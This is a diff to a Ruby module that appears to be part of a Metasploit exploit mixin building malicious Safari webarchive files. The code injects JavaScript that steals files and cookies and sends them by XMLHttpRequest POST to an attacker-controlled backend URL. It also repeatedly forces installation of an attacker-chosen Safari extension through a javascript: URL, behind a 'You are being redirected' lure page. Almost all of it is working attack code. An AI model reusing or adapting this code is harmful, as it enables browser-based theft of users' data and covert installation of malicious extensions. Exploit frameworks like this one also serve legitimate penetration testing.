@@ -91,24 +91,8 @@ module Webarchive
   # @return [String] mark up for embedding the iframes for each URL in a place that is
   #   invisible to the user
   def iframes_container_html
-    hidden_style = "position:fixed; left:-600px; top:-600px;"
     wrap_with_doc do
-      communication_js + injected_js_helpers + steal_files + install_extension + message
-    end
-  end
-
-  # @return [String] javascript code, wrapped in script tags, that is inserted into the
-  #   WebMainResource (parent) frame so that child frames can communicate "up" to the parent
-  #   and send data out to the listener
-  def communication_js
-    wrap_with_script do
-      %Q|
-        window.addEventListener('message', function(event){
-          var x = new XMLHttpRequest;
-          x.open('POST', '#{backend_url}#{collect_data_uri}', true);
-          x.send(event.data);
-        });
-      |
+      injected_js_helpers + steal_files + install_extension + message
     end
   end
 
@@ -122,23 +106,20 @@ module Webarchive
     raise "EXTENSION_ID datastore option missing" unless datastore['EXTENSION_ID'].present?
     wrap_with_script do
       %Q|
+      var qq = null;
       var extURL = atob('#{Rex::Text.encode_base64(datastore['EXTENSION_URL'])}');
       var extID = atob('#{Rex::Text.encode_base64(datastore['EXTENSION_ID'])}');
 
       function go(){
         window.focus();
-        window.open('javascript:safari&&(safari.installExtension\|\|(window.top.location.href.match(/extensions/)&&window.top.location.reload(false)))&&(safari.installExtension("'+extID+'", "'+extURL+'"), window.close());', 'x')
+        qq.open('javascript:safari&&(safari.installExtension\|\|(window.top.location.href.match(/extensions/)&&window.top.location.reload(false)))&&(safari.installExtension("'+extID+'", "'+extURL+'"), window.close());', '_self');
       }
-      if (!window.x){
-        alert(1);
-        window.onclick = function(){
-          x = window.open('#{apple_extension_url}', 'x');
-          setInterval(go, 400);
-        };
-      } else {
-        setInterval(go, 400);
-      }
-
+      window.addEventListener('message', function(e) {
+        if (!qq && e.data === 'EXT') {
+          qq = e.source;
+          setInterval(go, 3000);
+        }
+      });
       |
     end
   end
@@ -327,7 +308,11 @@ function reportStolenCookies() {
         window.sendData = function(key, val) {
           var data = {};
           data[key] = val;
-          window.top.postMessage(JSON.stringify(data), "*")
+
+          var x = new XMLHttpRequest;
+          x.open('POST', '#{backend_url}#{collect_data_uri}', true);
+          x.setRequestHeader('Content-type', 'text/plain')
+          x.send(JSON.stringify(data));
         };
       |
     end
@@ -355,7 +340,7 @@ function reportStolenCookies() {
 
   # @return [String] HTML content that is rendered in the <body> of the webarchive.
   def message
-    "<p>You are being redirected. <a href='#'>Click here if nothing happens</a>.</p>"
+    "<p>You are being redirected.</p>"
   end
 
   # @return [Array<String>] of URLs provided by the user
